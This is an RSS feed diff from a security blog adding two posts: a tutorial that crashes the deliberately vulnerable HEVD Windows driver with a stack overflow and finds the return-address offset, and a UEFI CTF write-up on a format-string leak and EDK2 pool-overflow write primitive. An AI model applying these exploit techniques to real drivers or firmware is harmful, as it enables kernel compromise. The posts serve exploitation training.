@@ -6,8 +6,209 @@
 		<generator>Hugo -- gohugo.io</generator>
 		<language>en-us</language>
 		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
-		<lastBuildDate>Mon, 29 Aug 2022 13:08:50 -0300</lastBuildDate>
+		<lastBuildDate>Sun, 11 Sep 2022 00:00:50 -0300</lastBuildDate>
 		<atom:link href="https://mdanilor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>[Cracking Windows Kernel with HEVD] Chapter 1: Will this driver ever crash?</title>
+			<link>https://mdanilor.github.io/posts/hevd-1/</link>
+			<pubDate>Sun, 11 Sep 2022 00:00:50 -0300</pubDate>
+			
+			<guid>https://mdanilor.github.io/posts/hevd-1/</guid>
+			<description>Cracking HackSys Extreme Vulnerable Driver: will this driver ever crash? Writing a BSOD crash Last time we focused on setting up the environment. This time we will try to understand the vulnerability and make our system crash! Let&amp;rsquo;s dive in!
+The vulnerable code (...) ULONG KernelBuffer[BUFFER_SIZE] = { 0 }; (...) // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR)); DbgPrint(&amp;quot;[+] UserBuffer: 0x%p\n&amp;quot;, UserBuffer); DbgPrint(&amp;quot;[+] UserBuffer Size: 0x%zX\n&amp;quot;, Size); DbgPrint(&amp;quot;[+] KernelBuffer: 0x%p\n&amp;quot;, &amp;amp;KernelBuffer); DbgPrint(&amp;quot;[+] KernelBuffer Size: 0x%zX\n&amp;quot;, sizeof(KernelBuffer)); (.</description>
+			<content type="html"><![CDATA[<h2 id="cracking-hacksys-extreme-vulnerable-driver-will-this-driver-ever-crash">Cracking HackSys Extreme Vulnerable Driver: will this driver ever crash?</h2>
+<h3 id="writing-a-bsod-crash">Writing a BSOD crash</h3>
+<p><a href="/posts/hevd-0/">Last time</a> we focused on setting up the environment. This time we will try to understand the vulnerability and make our system crash! Let&rsquo;s dive in!</p>
+<h4 id="the-vulnerable-code">The vulnerable code</h4>
+<pre><code>(...)
+    	ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
+(...)
+        // Verify if the buffer resides in user mode
+        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));
+
+        DbgPrint(&quot;[+] UserBuffer: 0x%p\n&quot;, UserBuffer);
+        DbgPrint(&quot;[+] UserBuffer Size: 0x%zX\n&quot;, Size);
+        DbgPrint(&quot;[+] KernelBuffer: 0x%p\n&quot;, &amp;KernelBuffer);
+        DbgPrint(&quot;[+] KernelBuffer Size: 0x%zX\n&quot;, sizeof(KernelBuffer));
+
+(...)
+
+        DbgPrint(&quot;[+] Triggering Buffer Overflow in Stack\n&quot;);
+
+        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
+        // because the developer is passing the user supplied size directly to
+        // RtlCopyMemory()/memcpy() without validating if the size is greater or
+        // equal to the size of KernelBuffer
+
+        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
+(...)
+</code></pre><p>The comments pretty much explain the whole code. The issue arises on <code>RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</code>, as it copies <code>Size</code> bytes, where <code>Size</code> is a user-defined length, from a user buffer to a kernel buffer of size <code>BUFFER_SIZE</code>. <code>BUFFER_SIZE</code> is defined in <code>Common.h</code> as 512. ULONG is 4 bytes long, thus <code>KernelBuffer</code> size is 2048 bytes. If the user sends a buffer larger than 2048, it will overflow.</p>
+<p>If you are new to stack overflow vulnerabilities, you might be asking yourself &ldquo;but how does a stack overflow can turn into elevation of privileges or arbitrary code execution?&quot;. That is a very valid concern and I will not go in depth here, as I have already explained in a previous post. You can read about it <a href="https://mdanilor.github.io/posts/hello-kernel/#the-stack">here</a>.</p>
+<h4 id="lets-write-some-code">Let&rsquo;s write some code</h4>
+<p>Fire up your Visual Studio and create an empty C++ project.</p>
+<p>First thing we have to do is find a way to communicate with our device driver. Device drivers can be accessed through Input Output Control (IOCTL), in which a userland application may call for functions implemented by the driver. Each IOCTL function implemented by the driver is assigned to a numeric identificator. Moreover, HEVD implements one IOCTL function for each vulnerability. This means that we have to know which IOCTL function number to &ldquo;call&rdquo; and reach the stack overflow vulnerability. For that, we can check the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h">code</a> out:</p>
+<pre><code>(...)
+
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
+#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)
+#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
+#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
+#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
+(...)
+</code></pre><p>As we can see, the buffer overflow stack is IOCTL function number 0x800.</p>
+<p>To use the IOCTL and call the buffer overflow stack function, we must get the handle for the device driver. Windows&rsquo; CreateFileA function, besides creating new files, opens handles for devices. Check the <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea?redirectedfrom=MSDN">doc page</a> for further information.</p>
+<p>So first let&rsquo;s write a function that gets the handle for the device:</p>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;Windows.h&gt;
+
+#define DEVICE_NAME	&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) // Gets the IOCTL number from the function number
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
+
+using namespace std;
+
+HANDLE get_handle() {
+	HANDLE h = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (h == INVALID_HANDLE_VALUE) {
+		printf(&quot;Failed to get handle =(\n&quot;);
+		return NULL;
+	}
+	return h;
+}
+</code></pre><p>The <code>get_handle()</code> function gets the handle (duh) to the device and returns it, in case of success. It calls CreateFileA function to do that, which parameters are covered below:</p>
+<ul>
+<li>File name - <code>DEVICE_NAME</code>: this is the name of the device to get the handle. The device name is <code>\\.\HackSysExtremeVulnerableDriver</code>, which is described in the driver source code. These weird extra <code>\</code> occur to correctly and safely convert to type <code>LPCSTR</code>, accepted by <code>CreateFileA()</code> function.</li>
+<li>Desired access - <code>FILE_READ_ACCESS | FILE_WRITE_ACCESS</code>: define which types of access we desire upon manipulating this file. It can be read, write or both, basically. Here we have chosen both.</li>
+<li>Shared mode - <code>FILE_SHARE_READ | FILE_SHARE_WRITE</code>: allows or disallows the file to be opened by other applications. In this case, we do not care too much about this right now. However, in specific scenarios, such as race condition, we might need to get more than one handle to the device.</li>
+<li>Security Attributes - <code>NULL</code>: this optional parameter regards to a few security attributes on the moment of opening the file. It is mostly used to allow handles to be inherited to other processes. In this case, we do not care about that.</li>
+<li>Creation disposition - <code>OPEN_EXISTING</code>: action to take when the desired file does not exist. With <code>OPEN_EXISTING</code>, it will raise an error should if the file does not exist. It is usual to use this when working with device drivers.</li>
+<li>Flags and attributes - <code>FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL</code>: as the name states, flags and attributes when opening this file. In this case, we are signaling that the file will be used for asynchronous IO.</li>
+<li>Template file - <code>NULL</code>: ignored when opening an existing file, so NULL here.</li>
+</ul>
+<p>We create and use the <code>IOCTL</code> macro, which utilizes <code>CTL_CODE</code> macro. This macro will not be explained here, but you can read the official documentation <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code">here</a>.</p>
+<p>Now we can do IOCTL just by calling <code>DeviceIoControl()</code> function. I will create a simple <code>do_buffer_overflow()</code> function now that will call the IOCTL sending a 0x1000 byte long buffer that will surely overflow the driver and we&rsquo;ll go on from that.</p>
+<pre><code>void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 0x1000;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	memset((char *)in_buffer, 'A', in_buffer_size);
+	printf(&quot;Sending buffer.\n&quot;);
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+</code></pre><p>What this does is allocate a buffer of size 0x1000 (4096) bytes, which overflows the 2048 byte-long KernelBuffer. Wrapping it up, this is our code:</p>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;Windows.h&gt;
+
+#define DEVICE_NAME	&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
+
+using namespace std;
+
+
+HANDLE get_handle() {
+	HANDLE h = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (h == INVALID_HANDLE_VALUE) {
+		printf(&quot;Failed to get handle =(\n&quot;);
+		return NULL;
+	}
+	return h;
+}
+
+void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 0x1000;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	memset((char *)in_buffer, 'A', in_buffer_size);
+	printf(&quot;Sending buffer.\n&quot;);
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+
+int main()
+{
+	do_buffer_overflow(get_handle());
+	system(&quot;pause&quot;);
+}
+</code></pre><p>Now let&rsquo;s put a breakpoint in HEVD function <code>TriggerBufferOverflowStack()</code> and run the exploit. Follow the steps below:</p>
+<ul>
+<li>Pause the execution on WinDbg.</li>
+<li>On the Command window, find the function by typing <code>x HEVD!TriggerBufferOverflowStack</code>. Click on the function.</li>
+<li>Click the link to the source code. The disassembly of the function will open in the Disassembly window.
+<img src="/posts/kernel2-img/7-breakpoint1.png" alt=""></li>
+<li>Navigate your way to the end of the function and put a breakpoint in the RET instruction. (Click the instruction and press F9 to insert a breakpoint)
+<img src="/posts/kernel2-img/8-breakpoint2.png" alt=""></li>
+<li>Resume execution (F5)</li>
+<li>Run the exploit</li>
+</ul>
+<p>The breakpoint hits! Aw yeah!</p>
+<p>I use the Memory window to check the stack out by puting <code>@rsp</code> in the &ldquo;Virtual&rdquo; and everything is &lsquo;A&rsquo;.</p>
+<p><img src="/posts/kernel2-img/9-as.png" alt=""></p>
+<p>If we continue, the machine crashes. Mission acomplished. Next step: overwrite the return address.</p>
+<h3 id="execution-flow-hijack">Execution flow hijack</h3>
+<p>We have already overwritten the return address to <code>AAAAAAAA</code>. Cool, but <code>0x4141414141414141</code> does not mean any valid address we can execute. We need to find out where exactly in our buffer the return address gets overwritten and replace it with a valid executable address. To which valid executable address we will redirect the execution will come up later on. What we need now is an offset.</p>
+<p>There are two ways to determine the offset for the return address. One way is to analyze the assembly code with WinDBG. The other is to use <a href="https://github.com/ickerwx/pattern">pattern</a>.</p>
+<h4 id="offset-discovery-with-windbg">Offset discovery with WinDBG</h4>
+<p>This method is pretty straightforward. If we look at the assembly code of the epilogue of the <code>hevd!TriggerBufferOverflowStack</code> function on WinDBG, we get this:</p>
+<p><img src="/posts/kernel2-img/10-functionepilogue.png" alt=""></p>
+<p>As we can see, it pops 3 64-bit (8 bytes) registers before it calls RET. If we peek at the HEVD source code, we find out the buffer has 2048 bytes. 2048 + 3*8 = 2072 and that is our buffer size.</p>
+<p>This method requires some extra manual evaluation and the visual inspection may be prone to human error, so there is a more assertive way shown next.</p>
+<h4 id="offset-discovery-with-pattern">Offset discovery with pattern</h4>
+<p>This approach is usually error free. First we use <a href="https://github.com/ickerwx/pattern">pattern</a> to create a pattern (duh) that will go in the buffer.</p>
+<p><code>pattern.py create 2100</code> will generate a 2100 byte long pattern to our buffer. It should look like this:</p>
+<p><img src="/posts/kernel2-img/11-patterncreate.png" alt=""></p>
+<p>These weird characters will be used to find out the offset. We will send this pattern in our buffer and use the same tool to find out which offset of the pattern reached to the instruction pointer.</p>
+<p>The code gets like this:</p>
+<pre><code>void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 2100;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	in_buffer = (PULONG) &quot;&lt;GENERATED_PATTERN_HERE&gt;&quot;
+	
+	printf(&quot;Sending buffer.\n&quot;);
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+	}
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+</code></pre><p>Now set up a breakpoint in <code>hevd!TriggerBufferOverflowStack</code>'s <code>ret</code> instruction and let us see the results.</p>
+<p>As soon as the breakpoint hits, which is just before the <code>ret</code> instruction executes, we peek at the memory (make sure to set up display format as ASCII) and check the top of the stack out:</p>
+<p><img src="/posts/kernel2-img/12-patterninstack.png" alt=""></p>
+<p>In my case, I have <code>0Cr1</code> at the top of my stack. So I&rsquo;ll run <a href="https://github.com/ickerwx/pattern">pattern</a>: <code>pattern.py offset 0Cr1 2100</code>, where <code>0Cr1</code> is the pattern for which I want the offset and 2100 is the size of the generated buffer. And the result is 2072:</p>
+<p><img src="/posts/kernel2-img/13-patteroffset.png" alt=""></p>
+<p>That way, we must put the return address in the position 2072 of our payload. This will redirect the execution flow to whatever address we put in this position. But this raises the next question: where do we redirect the execution flow to? Unfortunately, this question will be answered on the next part! See you then!</p>
+]]></content>
+		</item>
 		
 		<item>
 			<title>[Cracking Windows Kernel with HEVD] Chapter 0: Where do I start?</title>
@@ -83,6 +284,211 @@ sc start HEVD
 <p><img src="/posts/kernel2-img/6-allset.png" alt=""></p>
 <p>The environment is done! You may now debug your kernel. Try out a few experiments! Pause it. Put breakpoints. The sky is the limit.</p>
 <p>On the next part we will analyze the vulnerable driver and start exploiting it. See you then!!</p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>[Writeup] My take on d3guard, a UEFI CTF</title>
+			<link>https://mdanilor.github.io/posts/d3guard/</link>
+			<pubDate>Mon, 29 Aug 2022 13:08:50 -0300</pubDate>
+			
+			<guid>https://mdanilor.github.io/posts/d3guard/</guid>
+			<description>About the challenge d3ctf was a Chinese CTF which occurred a few months ago. I did not participate, but I was looking for CTFs on UEFI firmware exploitation and I found d3guard: a challenge from this CTF which was exactly what I was looking for.
+I would like to start stating that I found this challenge to be extremely difficult. In fact, it was one of the hardest I have done so far.</description>
+			<content type="html"><![CDATA[<h2 id="about-the-challenge">About the challenge</h2>
+<p>d3ctf was a Chinese CTF which occurred a few months ago. I did not participate, but I was looking for CTFs on UEFI firmware exploitation and I found <a href="https://github.com/yikesoftware/d3ctf-2022-pwn-d3guard">d3guard</a>: a challenge from this CTF which was exactly what I was looking for.</p>
+<p>I would like to start stating that I found this challenge to be extremely difficult. In fact, it was one of the hardest I have done so far. Not that this means too much, as I am still a learner in binary exploitation.</p>
+<p>I haven&rsquo;t found any writeups for this challenge except for the <a href="https://ctftime.org/writeup/32426">official one</a>, which, in my opinion, lacks some explanation. For that reason, I decided to do my own. Here it goes!</p>
+<h2 id="setting-things-up">Setting things up</h2>
+<p>Before we dive into this challenge, let us check a few things out and do some setups.</p>
+<p>First, let us observe the content inside the challenge&rsquo;s repository:</p>
+<pre><code>$ ls -lRh
+.:
+total 9,6M
+drwxrwxr-x 2 danilo danilo 4,0K set  4 16:41  contents
+-rwxrwxr-x 1 danilo danilo 6,5K set  4 16:41  exp.py
+-rw-rw-r-- 1 danilo danilo 4,0M set  4 16:41  OVMF.fd
+-rw-rw-r-- 1 danilo danilo 4,0M set  4 16:41  OVMF.fd.bak
+-rw-rw-r-- 1 danilo danilo  922 set  4 16:41  README.md
+-rw-rw-r-- 1 danilo danilo  561 set  4 16:41  run.py
+-rw-rw-r-- 1 danilo danilo 131K set  4 16:41  UiApp
+-rw-rw-r-- 1 danilo danilo 1,4M set  4 16:41  UiApp.i64
+-rw-rw-r-- 1 danilo danilo 7,2K set  4 16:41 'writeup en-US.md'
+-rw-rw-r-- 1 danilo danilo 6,3K set  4 16:41 'writeup zh-cn.md'
+
+./contents:
+total 13M
+-rw-rw-r-- 1 danilo danilo   77 set  4 16:41 boot.nsh
+-rwxrwxr-x 1 danilo danilo  10M set  4 16:41 bzImage
+-rw-rw-r-- 1 danilo danilo 2,7M set  4 16:41 rootfs.img
+-rw-rw-r-- 1 danilo danilo   45 set  4 16:41 startup.nsh
+</code></pre><p>Inside the repository for the challenge we may see some interesting files. There are the official writeups, one in Chinese and another in English, and the official exploit resolution (exp.py).</p>
+<p>There is an OVMF.fd and OVMF.fd.bak. OVMF.fd is the boot firmware.</p>
+<p>We may also see UiApp and UiApp.i64. UiApp is commonly the name of the user interface that is prompted after the reset, before loading the operating system.</p>
+<p>Inside contents folder, a Linux image (bzImage) may be observed, as well as the root file system (rootfs.img) and two EFI shell script files (boot.nsh and startup.nsh). Both scripts are used for booting Linux.</p>
+<pre><code>$ cat contents/boot.nsh 
+echo &quot;Booting...&quot;
+bzImage console=ttyS0 initrd=rootfs.img rdinit=/init quiet
+$ cat contents/startup.nsh 
+@echo -off
+cls
+boot.nsh
+reset -s &quot;Shutdown!&quot;
+</code></pre><p>Another interesting file at which we should take a glance is run.py:</p>
+<pre><code>$ cat run.py
+import os, subprocess
+import random
+
+def main():
+    try:
+        ret = subprocess.call([
+            &quot;qemu-system-x86_64&quot;,
+            &quot;-m&quot;, f&quot;{256+random.randint(0, 512)}&quot;,
+            &quot;-drive&quot;, f&quot;if=pflash,format=raw,file=OVMF.fd&quot;,
+            &quot;-drive&quot;, &quot;file=fat:rw:contents,format=raw&quot;,
+            &quot;-net&quot;, &quot;none&quot;,
+            &quot;-monitor&quot;, &quot;/dev/null&quot;,
+            &quot;-nographic&quot;
+        ], stderr=subprocess.DEVNULL)
+        print(&quot;Return:&quot;, ret)
+    except:
+        print(&quot;Error!&quot;)
+    finally:
+        print(&quot;Done.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre><p>This runs the challenge on QEMU. A very important parameter for us today is <code>-m</code>. This indicates the amount of RAM available to the emulated system. It may vary from 256 and 768, taking any random value inside this range. It was likely implemented this way to simulate some sort of ASLR, as changing the memory size will certainly cause alterations on the memory layout.</p>
+<p>For now, I will disable this <em>ASLRish</em> feature and will create my own script to run qemu:</p>
+<pre><code>$ cat run_qemu.sh 
+#!/bin/sh
+
+qemu-system-x86_64 -m 768M -drive if=pflash,format=raw,file=OVMF.fd -drive file=fat:rw:contents,format=raw -net none -nographic -monitor /dev/null -gdb tcp:localhost:1234 -S
+</code></pre><p>I added <code>-gdb</code> and <code>-S</code> args. The former will open a gdb server on port 1234 and the latter will force qemu to wait until gdb is attached and a <code>continue</code> command is prompted to start.</p>
+<p>We then fire up our gdb and run our start up script:</p>
+<p><img src="/posts/d3guard/0-gdb.png" alt=""></p>
+<p>On gdb, we put <code>target remote :1234</code>. It will attach to qemu. We then must send a continue command to get the ctf started.</p>
+<p>The CTF soon boots a Linux machine.</p>
+<p><img src="/posts/d3guard/1-cantopenflag.png" alt=""></p>
+<p>Ok. I restart the ctf and quickly press <code>esc</code> key before boot.</p>
+<p><img src="/posts/d3guard/2-uiapp.png" alt=""></p>
+<p>We see this interface. Remember the UiApp we have seen earlier? This is it.</p>
+<p>Inspecting the administrator menu, we are asked for a username:</p>
+<p><img src="/posts/d3guard/3-adminmenu.png" alt=""></p>
+<p>The username is reflected into the message: &ldquo;User [admin] not found!!&quot;. Maybe there is a format string vulnerability?</p>
+<p><img src="/posts/d3guard/4-formatstring.png" alt=""></p>
+<p>Bingo!</p>
+<p>One might suggest, as a possible path for exploitation, to use this format string bug to write data to a pointer. Such exploitation technique may be observed <a href="https://owasp.org/www-community/attacks/Format_string_attack">in this link</a>. However, this technique is no good here. The edk2 (base firmware implementation) <a href="https://github.com/tianocore/edk2-test/blob/master/uefi-sct/SctPkg/SCRT/SCRTDriver/Print.c">source code</a> shows us that <code>%n</code> type is not present in this implementation of printf.</p>
+<p>Nonetheless, we will still use this vulnerability for memory leaks. Keep in mind we will still need to bypass ASLR.</p>
+<p>Let&rsquo;s check the visitor menu:</p>
+<p><img src="/posts/d3guard/5-visitormenu-home.png" alt=""></p>
+<p>We may insert a new visitor:</p>
+<p><img src="/posts/d3guard/6-visitormenu-new.png" alt=""></p>
+<p>Or edit existing visitor:</p>
+<p><img src="/posts/d3guard/7-visitormenu-edit.png" alt=""></p>
+<p>We can also clear info or confirm and enter OS, which will lead us to the same Linux as we entered before.</p>
+<h2 id="reverse-engineering-the-ctf-and-finding-our-vulnerability">Reverse engineering the CTF and finding our vulnerability</h2>
+<p>Allright. Let us do some reverse engineering. I will use IDA Pro for this, but ghidra would do the trick just fine as well. First let us take a look at the program&rsquo;s strings:</p>
+<p><img src="/posts/d3guard/8-idastrings.png" alt=""></p>
+<p>We have seen these strings before! Let us see where it is used:</p>
+<p><img src="/posts/d3guard/9-idastrings-graph.png" alt=""></p>
+<p><img src="/posts/d3guard/10-idastrings-code.png" alt=""></p>
+<p>Found the code! Now we must do some code review&hellip;</p>
+<p>After spending a few hours looking at the decompiled code, it is possible to find an overflow vulnerability in the edit visitor function:</p>
+<p><img src="/posts/d3guard/11-pooloverflow.png" alt=""></p>
+<p>Before we dive into the code above, some things must be clarified. I renamed a few functions and a data structure on my IDA to facilitate our comprehension.</p>
+<p><code>STRUCT_VISITOR</code> is the structure which will store visitor data. More specifically, the visitor id, name and description. The id is an integer type. Name and description, on the other hand, are byte arrays. On <code>STRUCT_VISITOR</code>, only the pointers to name and description are stored, as well as the value of the id. It looks something like this:</p>
+<pre><code>typedef struct {
+	int id;
+	char *name;
+	char *description;
+} STRUCT_VISITOR;
+</code></pre><p>When you see <code>STRUCT_VISITOR + 8</code> at the pseudocode, read it as <code>STRUCT_VISITOR-&gt;name</code>. Similarly, <code>STRUCT_VISITOR + 16</code> is equivalent to <code>STRUCT_VISITOR-&gt;description</code>.</p>
+<p>Now, looking at the pseudocode, we see, on <code>(I)</code>, a sanity check to verify if there is a name allocated. The same is done with description. If none is allocated, we may observe on <code>(II)</code> and <code>(III)</code> 24 and 56 bytes being allocated to name and description, respectively. On <code>(IV)</code>, just after a read of arbitrary size (on <code>sub_611()</code>) is performed. The data read from the user keyboard will then be copied to the description buffer in <code>(V)</code>, but notice in <code>(IV)</code> that the size provided is 128, larger than the 56 bytes shown in <code>(III)</code>.</p>
+<p>Summarizing, on edit visitor functionality, a 56-byte long buffer is allocated to description, but 128 bytes are being copied. There is our pool overflow.</p>
+<h2 id="edk2-allocator">EDK2 allocator</h2>
+<p>We must understand how EDK2 allocator works in order to exploit this pool overflow. We will now take a break from the CTF and focus on the UEFI memory allocator. This piece of the puzzle will be very important to solve this challenge later on.</p>
+<p>Be advised that many aspects of the allocator will be simplified here. Other parts may be overlooked. For a detailed understanding of EDK2 allocator, you may check the <a href="https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Core/Dxe/Mem/Pool.c">source code</a> or <a href="https://laurie0131.gitbooks.io/atbb-mitigate-buffer-overflow-in-uefi/content/additional_overflow_detection/heap_management_in_edkii.html">this brilliant gitbook</a>.</p>
+<h3 id="types-of-memory-allocation">Types of memory allocation</h3>
+<p>Free memory chunks are divided into a few categories according to their type and size. Chunks can be one of 15 memory types, which we will not see in depth here. Just be advised that there are different memory types and chunks of same type and size are stored together, in the same list.</p>
+<p>The size is also important for clustering free chunks. Free chunks are divided by memory types, but also by indexes. Available sizes for allocation are 128, 256, 384, 640, 1024, 1664, 2688, 4352, 7040, 11392, 18432 and 29824. This size includes an overhead of 40 bytes, necessary to maintain the chunk. Chunks of size 128 and memory type 1 (EfiLoaderCode), for instance, are stored in the same list.</p>
+<h3 id="how-free-chunks-are-stored">How free chunks are stored</h3>
+<p><img src="/posts/d3guard/12-pool-organization.png" alt=""></p>
+<p>Each memory type has a Pool Head, which contains a vector of <code>FreeList</code> with as many elements as there are indexes. Each element of this vector points to a double-linked list of free chunks of that index (or size).</p>
+<p>Ok. Very tricky. Summarizing: for each memory type there is a PoolHead structure, containing 12 free lists, organized as a vector. The N-th element of this vector will point to a double-linked list of free chunks. The size of these free chunks will depend on N. If N is 0, then the chunk size is 128.</p>
+<p>There is also a 40-byte overhead for each chunk. Say a developer tries to allocate 100 bytes. The developer will receive a chunk of index 1, not 0, as <code>100 + 40 = 140</code>, and <code>128 &lt; 140 &lt; 256</code>.</p>
+<p>Below you may see the pool head structure:</p>
+<pre><code>typedef struct {
+  INTN               Signature;
+  UINTN              Used;
+  EFI_MEMORY_TYPE    MemoryType;
+  LIST_ENTRY         FreeList[MAX_POOL_LIST];
+  LIST_ENTRY         Link;
+} POOL;
+</code></pre><p>You may observe above that <code>LIST_ENTRY</code> is the linked list. Below you may find its definition:</p>
+<pre><code>typedef struct _LIST_ENTRY LIST_ENTRY;
+//...
+struct _LIST_ENTRY {
+  LIST_ENTRY    *ForwardLink;
+  LIST_ENTRY    *BackLink;
+};
+</code></pre><p>It is used by <code>POOL_FREE</code> struct to make it a double-linked list:</p>
+<pre><code>typedef struct {
+  UINT32        Signature;
+  UINT32        Index;
+  LIST_ENTRY    Link;
+} POOL_FREE;
+</code></pre><h3 id="life-and-death-of-a-chunk">Life and death of a chunk</h3>
+<p>When a chunk is requested for allocation, the algorithm will first find the POOL structure that matches the memory type requested by the developer. Next, it will find the free list index which size is the smallest that will fit the requested size.</p>
+<p>Allocated chunks will have a <code>POOL_HEAD</code> and a <code>POOL_TAIL</code>. These are the definitions:</p>
+<pre><code>typedef struct {
+  UINT32             Signature;
+  UINT32             Reserved;
+  EFI_MEMORY_TYPE    Type;
+  UINTN              Size;
+  CHAR8              Data[1];
+} POOL_HEAD;
+
+(...)
+
+typedef struct {
+  UINT32    Signature;
+  UINT32    Reserved;
+  UINTN     Size;
+} POOL_TAIL;
+</code></pre><p>Upon memory liberation, the allocation algorithm will perform several sanity checks. For instance, the signatures of <code>POOL_HEAD</code> and <code>POOL_TAIL</code> will be checked. After sanity checks are done, it will fill the chunk with garbage and put it at the top of the corresponding free list (LIFO).</p>
+<h3 id="exploiting-an-overflow">Exploiting an overflow</h3>
+<p>The last sentence from the paragraph above is very important. The freed chunk will be added to the top of the corresponding free list. Going back to <code>LIST_ENTRY</code> struct and <code>POOL_FREE</code> struct, we have something like this in memory:</p>
+<pre><code>┌─────────────┐
+│  Signature  │
+├─────────────┤
+│    Index    │
+├─────────────┤
+│*ForwardLink │
+├─────────────┤
+│  *BackLink  │
+└─────────────┘
+</code></pre><p>If we can overwrite ForwardLink and BackLink to arbitrary values by abusing a pool overflow, we get a write-what-where primitive when this chunk gets allocated again.
+That happens because, upon allocation, the algorithm must delete this entry from the double-linked list. To do so, the function <code>RemoveEntryList (&amp;Free-&gt;Link);</code> is called. If we look at its implementation:</p>
+<pre><code>LIST_ENTRY *EFIAPI RemoveEntryList (IN CONST LIST_ENTRY  *Entry)
+{
+  ASSERT (!IsListEmpty (Entry));
+
+  Entry-&gt;ForwardLink-&gt;BackLink = Entry-&gt;BackLink;
+  Entry-&gt;BackLink-&gt;ForwardLink = Entry-&gt;ForwardLink;
+  return Entry-&gt;ForwardLink;
+}
+</code></pre><p>From the implementation, we can see clearly the write-what-where primitive. If we put the <strong>WHAT</strong> value in ForwardLink and the <strong>WHERE</strong> value in BackLink, the primitive will be executed as soon as this chunk gets allocated.</p>
+<h2 id="memory-layout">Memory layout</h2>
+<p>We have a few pieces to our puzzle here:</p>
+<pre><code>* A pointer leak;
+* A pool overflow;
+* A strategy for turning a pool overflow into an arbitrary memory write.
+</code></pre>
+<p>But a few important pieces are missing:</p>
+<pre><code>* How is the memory organized? Can we actually get the scenario described in the previous section? 
+* If we achieve the write-what-where primitive, what would we write? And where?
+</code></pre>
 ]]></content>
 		</item>
 		
